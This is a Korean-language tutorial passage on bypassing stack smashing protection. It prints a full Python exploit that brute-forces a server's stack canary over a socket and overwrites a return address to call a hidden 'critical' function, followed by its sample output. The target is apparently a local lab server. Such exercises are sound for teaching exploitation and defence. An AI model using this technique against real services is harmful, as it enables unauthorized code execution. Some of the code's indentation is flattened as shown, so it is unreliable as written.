Bypassing SSP - 2 :
    ssp_server.py는 브루트 포싱 공격을 통해 ssp_server의 스택 카나리 값을 알아낸 후
    handler 함수의 리턴 주소를 critical 함수의 주소인 0x80486db로 덮어 critical 함수를 호출하는 공격 코드입니다.
    ex)
        #!/usr/bin/python
        import struct
        import socket
        import time
        def p32(val):
        return struct.pack("<I", val)
        def u32(val):
        return struct.unpack("<I", val)[0]
        def recvuntil(sock, needle):
        res = ''
        while True:
            res += sock.recv(1)
            if needle in res:
            return res
        IP = '127.0.0.1'
        PORT = 31337
        # First byte of canary is NULL byte
        canary = '\x00'
        for _ in range(3):
        for i in range(256):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, PORT))
            recvuntil(s, "What is your name? ")
            payload = "A"*0x20
            payload += canary + chr(i)
            s.send(payload)
            res = s.recv(1024)
            if 'See you again.' in res:
            canary += chr(i)
            print `canary`
            s.close()
            break
            s.close()
        print `"Stack Canary : " + canary`
        CRITICAL_ADDR = 0x080486db 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        client_fd = u32(s.recv(4))
        print "client fd : %d"%client_fd
        recvuntil(s, "What is your name? ")
        payload = "A"*0x20
        payload += canary
        payload += "B"*0xc
        payload += p32(CRITICAL_ADDR)
        payload += p32(0xdeadbeef)
        payload += p32(client_fd)
        s.send(payload)
        print `s.recv(1024)`
        s.close()

    line 26 - line 45에서 스택 카나리의 상위 3 바이트를 알아내고,
    line 58 - line 65에서 알아낸 스택 카나리를 이용해 handler 함수의 리턴 주소를 critical 함수의 주소로 덮습니다. 
    또한 line 53에서 알아낸 클라이언트의 소켓 파일 디스크립터 client_fd를 critical 함수의 인자로 전달합니다.

    다음은 ssp_server.py의 실행 결과입니다.
    critical 함수가 호출되어 critical_msg가 출력된 것을 확인할 수 있습니다.
    ex)
        $ python ssp_server.py
        '\x00\x04'
        '\x00\x04\xb7'
        '\x00\x04\xb7\xdc'
        'Stack Canary : \x00\x04\xb7\xdc'
        client fd : 4
        'THIS_FUNCTION_SHOULD_NOT_BE_CALLED'





































